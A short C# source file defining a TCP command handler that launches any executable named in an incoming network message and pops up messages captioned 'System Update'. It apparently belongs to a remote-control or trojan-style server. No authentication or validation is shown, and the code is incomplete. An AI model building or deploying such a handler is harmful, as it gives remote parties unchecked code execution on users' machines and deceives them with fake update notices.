using System;
using System.Collections.Generic;
using System.Text;
using ServerDLL.CommandHandler;
using System.Windows.Forms;


namespace ServerDLL.CommandHandler.TCP
{
    class DefaultRequestHandler : AbstractCommandHandler  
    {
        public override void HandleCommand(CommadMessage message)
        {
            switch (GetRequestType(message.Message))
            {
                case "exe":
                    StartExe(argumentList[0]);
                    break;
                case "message":
                    MessageBox.Show(argumentList[0], "System Update", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
            }
            
        }

        private void StartExe(string exe)
        {
            try
            {
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.EnableRaisingEvents = false;
                proc.StartInfo.FileName = exe;
                proc.Start();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}
